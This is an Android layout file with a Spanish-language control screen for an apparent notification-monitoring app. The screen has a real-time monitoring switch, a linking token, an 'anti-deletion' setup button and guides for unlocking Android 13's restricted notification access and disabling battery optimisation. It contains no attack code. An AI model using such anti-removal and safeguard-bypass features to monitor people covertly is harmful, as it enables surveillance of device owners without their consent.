<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#F3F4F6">

    <LinearLayout
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:padding="24dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Control de Sincronización"
            android:textSize="22sp"
            android:textStyle="bold"
            android:textColor="#111827"
            android:layout_marginBottom="24dp" />

        <!-- Banner de Advertencia de Permisos (Visible solo si falta permiso) -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/card_permission_warning"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="20dp"
            app:cardCornerRadius="12dp"
            app:cardElevation="0dp"
            app:strokeWidth="1dp"
            app:strokeColor="#FECACA"
            app:cardBackgroundColor="#FEF2F2"
            android:visibility="gone">

            <LinearLayout
                android:orientation="vertical"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:padding="16dp">

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="⚠️ Permisos Bloqueados"
                    android:textColor="#991B1B"
                    android:textStyle="bold"
                    android:textSize="16sp" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Android 13+ ha restringido el acceso a notificaciones. Debe desbloquearlo manualmente."
                    android:textColor="#B91C1C"
                    android:textSize="13sp"
                    android:layout_marginTop="4dp" />

                <Button
                    android:id="@+id/btn_help_permission"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginTop="12dp"
                    android:text="VER CÓMO DESBLOQUEAR"
                    android:backgroundTint="#EF4444"
                    android:textColor="@android:color/white"
                    style="@style/Widget.Material3.Button.TonalButton" />
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Sección de Optimización por Marca (Detección Automática) -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/card_brand_optimization"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="20dp"
            app:cardCornerRadius="12dp"
            app:cardElevation="2dp"
            app:strokeWidth="1dp"
            app:strokeColor="#DBEAFE"
            app:cardBackgroundColor="#EFF6FF">

            <LinearLayout
                android:orientation="vertical"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:padding="16dp">

                <TextView
                    android:id="@+id/tv_brand_title"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Optimización para su dispositivo"
                    android:textColor="#1E40AF"
                    android:textStyle="bold"
                    android:textSize="16sp" />

                <TextView
                    android:id="@+id/tv_brand_guide"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Siga los pasos para evitar que el sistema detenga el monitoreo."
                    android:textColor="#1E3A8A"
                    android:textSize="13sp"
                    android:layout_marginTop="4dp" />

                <Button
                    android:id="@+id/btn_brand_settings"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginTop="12dp"
                    android:text="ABRIR AJUSTES ESPECIALES"
                    android:backgroundTint="#3B82F6"
                    android:textColor="@android:color/white"
                    style="@style/Widget.Material3.Button.TonalButton" />
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Interruptor Maestro -->
        <com.google.android.material.materialswitch.MaterialSwitch
            android:id="@+id/sw_monitoring"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Monitoreo en tiempo real"
            android:textSize="16sp"
            android:checked="true"
            android:padding="12dp"
            android:background="@android:color/white" />

        <TextView
            android:id="@+id/tv_status"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:textSize="14sp"
            android:textColor="#6B7280"
            android:text="Cargando estado..." />

        <!-- Token Editable -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Token de Vinculación:"
            android:textStyle="bold"
            android:layout_marginTop="32dp" />

        <com.google.android.material.textfield.TextInputLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox">

            <com.google.android.material.textfield.TextInputEditText
                android:id="@+id/et_token_edit"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="Token"
                android:inputType="textNoSuggestions"
                android:fontFamily="monospace" />
        </com.google.android.material.textfield.TextInputLayout>

        <Button
            android:id="@+id/btn_save_token"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            style="?attr/borderlessButtonStyle"
            android:text="GUARDAR TOKEN"
            android:textColor="#4F46E5"
            android:layout_gravity="end" />

        <!-- Pruebas y Seguridad -->
        <Button
            android:id="@+id/btn_test"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="32dp"
            android:text="ENVIAR SEÑAL DE PRUEBA"
            android:backgroundTint="#4F46E5" />

        <Button
            android:id="@+id/btn_admin"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="16dp"
            android:text="CONFIGURAR ANTI-BORRADO"
            android:backgroundTint="#EF4444" />

        <Button
            android:id="@+id/btn_disable"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="16dp"
            android:text="AJUSTES DE NOTIFICACIONES"
            style="?attr/materialButtonOutlinedStyle" />

        <Button
            android:id="@+id/btn_refresh_service"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:text="REINICIAR LECTOR (Si falla)"
            style="?attr/materialButtonOutlinedStyle" />

        <Button
            android:id="@+id/btn_app_info"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:text="INFORMACIÓN DE LA APP (3 PUNTOS ⋮)"
            style="?attr/materialButtonOutlinedStyle" />

        <Button
            android:id="@+id/btn_battery"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:text="OPTIMIZACIÓN DE BATERÍA"
            style="?attr/materialButtonOutlinedStyle" />

    </LinearLayout>
</ScrollView>
